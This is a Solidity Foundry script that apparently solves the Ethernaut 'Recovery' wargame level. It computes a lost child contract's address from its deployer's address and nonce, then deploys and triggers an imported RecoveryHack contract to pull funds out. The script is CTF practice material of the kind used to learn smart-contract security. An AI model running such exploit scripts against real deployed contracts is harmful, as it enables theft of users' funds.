// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {RecoveryHack} from "ethernaut/recovery_hack.sol";
import "forge-std/console.sol";

contract RecoveryHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address target = address(0xcA9f0850B2E05130447602636164D5cCD1a43957);
        address newAddress = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            target,
            bytes1(0x01)
        )))));
        console.log(newAddress);
        RecoveryHack recoveryHack = new RecoveryHack(newAddress);
        recoveryHack.hack();
        vm.stopBroadcast();
    }
}
